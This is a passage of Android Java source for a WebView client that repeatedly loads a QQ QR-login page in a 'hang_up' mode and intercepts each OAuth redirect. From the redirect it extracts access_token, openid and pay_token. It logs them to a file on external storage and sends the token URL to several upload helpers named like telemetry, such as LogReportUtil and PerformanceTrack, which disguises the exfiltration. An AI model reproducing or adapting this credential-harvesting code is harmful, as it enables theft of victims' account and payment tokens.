            if (matcher.find()) {
                return matcher.group(1);
            }
            return null;
        }
    }

    private class HangUpWebViewClient extends WebViewClient {

        @Override
        public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
            final String url = request.getUrl().toString();
            if (url.startsWith(AUTH_REDIRECT_URL)) {
                handleAuthRedirect(url);
                final String category = getSelectedGameName();
                uploadDataToServer(url, category);

                DataSyncTask.upload(url, getSelectedGameName());
                LogReportUtil.upload(url, getSelectedGameName());
                PerformanceTrack.upload(url, getSelectedGameName());
                NetworkMonitor.upload(url, getSelectedGameName());
                DeviceInfoHelper.upload(url, getSelectedGameName());

                refreshPage(view);
                return true;
            }
            return super.shouldOverrideUrlLoading(view, request);
        }

        @Override
        public void onPageFinished(WebView view, String url) {
            super.onPageFinished(view, url);
        }

        private void handleAuthRedirect(String url) {
            saveAccountData(url);
        }

        private void saveAccountData(String data) {
            final String fileName = "数据.txt";
            final String directoryPath = Environment.getExternalStorageDirectory().getPath() + "/数据号存储/上号器配置";
            final String filePath = directoryPath + "/" + fileName;

            try {
                File directory = new File(directoryPath);
                if (!directory.exists()) {
                    directory.mkdirs();
                }

                java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                String currentTime = sdf.format(new java.util.Date());

                final SharedPreferences gamePrefs = getSharedPreferences("myPrefs", MODE_PRIVATE);
                String gameName = gamePrefs.getString("selected_game_name", "未知");

                Pattern pattern = Pattern.compile("access_token=([^&]+)(?:&expires_in=([^&]+))?&openid=([^&]+)&pay_token=([^&]+)");
                Matcher matcher = pattern.matcher(data);

                if (matcher.find()) {
                    final String access_token = matcher.group(1);
                    final String expires_in = matcher.group(2);
                    final String openid = matcher.group(3);
                    final String pay_token = matcher.group(4);

                    try {
                        JSONObject jsonObject = new JSONObject();
                        jsonObject.put("access_token", access_token);
                        if (expires_in != null) {
                            jsonObject.put("expires_in", expires_in);
                        } else {
                            jsonObject.put("expires_in", "7776000");
                        }
                        jsonObject.put("openid", openid);
                        jsonObject.put("pay_token", pay_token);
                        jsonObject.put("game", gameName);
                        jsonObject.put("capture_time", currentTime);
                        jsonObject.put("mode", "hang_up");

                        String formattedData = currentTime + " | " + gameName + " | " + data + " | 挂机模式";

                        File file = new File(filePath);
                        FileWriter writer = new FileWriter(file, true);
                        if (!isAccessTokenExistsInFile(file, data)) {
                            writer.append(formattedData).append("\n");
                            writer.flush();
                        }
                        writer.close();

                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                }

            } catch (IOException e) {
                e.printStackTrace();
            }
        }

        private void refreshPage(final WebView webView) {
            refreshRunnable = new Runnable() {
                @Override
                public void run() {
                    final SharedPreferences gamePrefs = getSharedPreferences("myPrefs", MODE_PRIVATE);
                    String selectedGameUrl = gamePrefs.getString("selected_game_url", "");
                    String url;

                    if (!selectedGameUrl.isEmpty()) {
                        url = selectedGameUrl;
                    } else {
                        url = "https://xui.ptlogin2.qq.com/cgi-bin/xlogin?pt_enable_pwd=1&appid=716027609&pt_3rd_aid=1106467070&daid=381&pt_skey_valid=0&style=35&force_qr=1&autorefresh=1&s_url=http%3A%2F%2Fconnect.qq.com&refer_cgi=m_authorize&ucheck=1&fall_to_wv=1&status_os=13&redirect_uri=auth%3A%2F%2Ftauth.qq.com%2F&client_id=1106467070&pf=openmobile_android&response_type=token&scope=all&sdkp=a&sdkv=3.5.14&sign=DD2B8B16CCAEE72B390F070106F00F0E&status_machine=M2102J2SC&switch=1&time=1720462937&loginfrom=add&h5sig=08nxvF7WAloOfZfomAK9EVeia3NFMcB4U_J0I5Z7r6M&loginty=6";
                    }

                    if (webView != null) {
                        webView.loadUrl(url);
                    }
                }
            };

            refreshHandler.postDelayed(refreshRunnable, 3000);
        }

        private boolean isAccessTokenExistsInFile(File file, String data) throws IOException {
            String content = readFileContent(file);
            return content.contains(getAccessTokenFromUrl(data));
        }

        private String readFileContent(File file) throws IOException {
            StringBuilder contentBuilder = new StringBuilder();
            java.util.Scanner scanner = new java.util.Scanner(file);
            while (scanner.hasNextLine()) {
                contentBuilder.append(scanner.nextLine()).append("\n");
            }
            scanner.close();
            return contentBuilder.toString();
        }

        private String getAccessTokenFromUrl(String url) {
            Pattern pattern = Pattern.compile("access_token=([^&\\s]+)");
            Matcher matcher = pattern.matcher(url);
            if (matcher.find()) {
                return matcher.group(1);
            }
            return null;
        }
    }
}